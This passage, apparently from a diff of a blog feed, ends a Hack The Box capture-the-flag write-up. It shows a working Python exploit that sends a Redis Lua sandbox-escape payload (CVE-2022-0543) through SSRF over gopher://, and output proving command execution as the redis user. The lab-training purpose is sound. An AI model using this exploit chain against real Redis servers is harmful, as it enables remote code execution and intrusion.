+&lt;/div>&lt;p>I passed this &lt;em>payload&lt;/em> to the &lt;a class="link" href="https://redis.io/docs/latest/commands/eval/" target="_blank" rel="noopener"
+>eval&lt;/a> command of the &lt;em>Redis&lt;/em> client.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">urllib.parse&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">quote&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">URL&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://&amp;lt;TARGET:HOST&amp;gt;/api/red/generate&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">quote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">eval &amp;#39;local io_l = package.loadlib(&amp;#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&amp;#34;, &amp;#34;luaopen_io&amp;#34;); local io = io_l(); local f = io.popen(&amp;#34;id&amp;#34;, &amp;#34;r&amp;#34;); local res = f:read(&amp;#34;*a&amp;#34;); f:close(); return res&amp;#39; 0
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">quit
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">input&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;url&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;gopher://&amp;lt;TARGET:HOST&amp;gt;:6379/_&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;application/json&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;Cookie&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;SESSION_COOKIE&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">request&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">URL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">json&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">input&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">headers&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s2">n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s2">r&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>I was able to successfully achieve &lt;strong>RCE&lt;/strong> on the host.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">$ python script.py
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>&lt;span class="s1">&amp;#39;message&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;Unknown error occured while fetching the image file: $48
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">uid=101(redis) gid=101(redis) groups=101(redis)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">+OK
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The flag was located at the system &lt;em>root&lt;/em> as an executable.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">$ python script.py
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>&lt;span class="s1">&amp;#39;message&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;Unknown error occured while fetching the image file: $32
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">HTB{&amp;lt;REDACTED&amp;gt;}
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">+OK
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="references">&lt;a href="#references" class="header-anchor">&lt;/a>References
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a class="link" href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener"
+>https://portswigger.net/web-security/ssrf&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener"
+>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.npmjs.com/package/node-libcurl" target="_blank" rel="noopener"
+>https://www.npmjs.com/package/node-libcurl&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://docs.kernel.org/filesystems/proc.html" target="_blank" rel="noopener"
+>https://docs.kernel.org/filesystems/proc.html&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://redis.io" target="_blank" rel="noopener"
+>https://redis.io&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://en.wikipedia.org/wiki/Gopher_%28protocol%29" target="_blank" rel="noopener"
+>https://en.wikipedia.org/wiki/Gopher_(protocol)&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md" target="_blank" rel="noopener"
+>https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce" target="_blank" rel="noopener"
+>https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce&lt;/a>&lt;/li>
+&lt;/ul></description></item></channel></rss>
